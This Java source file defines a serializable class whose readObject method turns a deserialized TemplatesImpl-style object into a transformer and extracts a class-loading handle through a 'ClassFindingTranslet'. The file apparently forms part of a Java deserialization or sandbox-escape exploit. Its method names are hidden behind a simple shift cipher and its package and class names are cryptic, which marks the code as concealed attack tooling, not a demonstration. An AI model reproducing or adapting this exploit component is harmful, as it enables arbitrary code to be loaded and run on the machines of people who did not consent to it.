package x;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

/**
 * Encrypted Classes holder, just the deserializing part.
 */
public class EC implements Serializable {

	public static Object t;
	
	private static final long serialVersionUID = 7184753337713309073L;

	transient List<File> files = new ArrayList<File>();

	public EC() {
	}
	
	public Class<?> getClass(String name) throws ClassNotFoundException {
		Method m;
		try {
			m = t.getClass().getMethod(x.Strings.dec("hfuDmbtt"), new Class[] { String.class });
			return (Class<?>) m.invoke(t, name);
		} catch (Exception e) {
			throw new RuntimeException(x.Strings.dec("y"),e);
		}
	}
		     
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
//    	TemplatesImpl templatesImpl = (TemplatesImpl) in.readObject();
    	Object templatesImpl = in.readObject();
    	try {
    		// This instantiates the ClassFindingTranslet
//			TransformerImpl impl = (TransformerImpl) templatesImpl.newTransformer();
			Object impl = templatesImpl.getClass().getMethod(x.Strings.dec("ofxUsbotgpsnfs")).invoke(templatesImpl);
			t = impl.getClass().getMethod(x.Strings.dec("hfuQbsbnfufs"),String.class).invoke(impl, x.Strings.dec("y"));
		} catch (Exception e) {
			throw new RuntimeException(x.Strings.dec("y"),e);
		} 
    }
	
}
